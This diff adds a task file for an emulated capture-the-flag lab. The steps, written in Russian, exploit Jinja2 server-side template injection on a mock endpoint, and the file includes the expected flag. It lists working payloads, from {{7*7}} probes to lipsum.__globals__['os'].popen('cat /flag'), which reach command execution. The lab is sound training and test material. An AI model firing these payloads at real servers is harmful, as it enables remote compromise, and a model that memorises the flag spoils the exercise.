@@ -1,0 +1,57 @@
+{
+  "id": "web-ssti-engines",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{j1nj4_1s_pyth0n_und3r_th3_h00d}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: SSTI на notify.example\n\nЭндпоинт `http://notify.example/render?name=` подставляет `name` в шаблон.\n\n1. Определи синтаксис: `curl -s 'http://notify.example/render?name={{7*7}}'` → `49`.\n   И `curl -s 'http://notify.example/render?name=${7*7}'` → литерал (не вычислилось).\n2. Определи язык: `curl -s \"http://notify.example/render?name={{7*'7'}}\"` → `7777777` = Jinja2 (Python).\n3. RCE: `curl -s \"http://notify.example/render?name={{lipsum.__globals__['os'].popen('id').read()}}\"` → `uid=1000(app)`.\n4. Флаг: `... popen('cat /flag').read() ...`.\n5. `... | grep 'nto' > found.txt`, затем `check`.\nЕсли `{{` «глобится» curl — добавь `-g`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция notify.example/render)",
+      "cases": [
+        {
+          "match": "lipsum.*flag",
+          "example": "-G --data-urlencode \"name={{lipsum.__globals__['os'].popen('cat /flag').read()}}\"",
+          "output": "Здравствуйте, nto{j1nj4_1s_pyth0n_und3r_th3_h00d}!\n"
+        },
+        {
+          "match": "popen",
+          "example": "-G --data-urlencode \"name={{lipsum.__globals__['os'].popen('id').read()}}\"",
+          "output": "Здравствуйте, uid=1000(app) gid=1000(app)!\n"
+        },
+        {
+          "match": "7\\*['\\\"]7['\\\"]",
+          "example": "-G --data-urlencode \"name={{7*'7'}}\"",
+          "output": "Здравствуйте, 7777777!\n"
+        },
+        {
+          "match": "\\{\\{7\\*7\\}\\}",
+          "example": "-s 'http://notify.example/render?name={{7*7}}'",
+          "output": "Здравствуйте, 49!\n"
+        },
+        {
+          "match": "\\$\\{7\\*7\\}",
+          "example": "-s 'http://notify.example/render?name=${7*7}'",
+          "output": "Здравствуйте, ${7*7}!\n"
+        },
+        {
+          "match": "\\{\\{7\\*7$",
+          "example": "-s 'http://notify.example/render?name={{7*7'",
+          "output": "jinja2.exceptions.TemplateSyntaxError: unexpected end of template\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только http://notify.example/render.\n"
+    }
+  }
+}
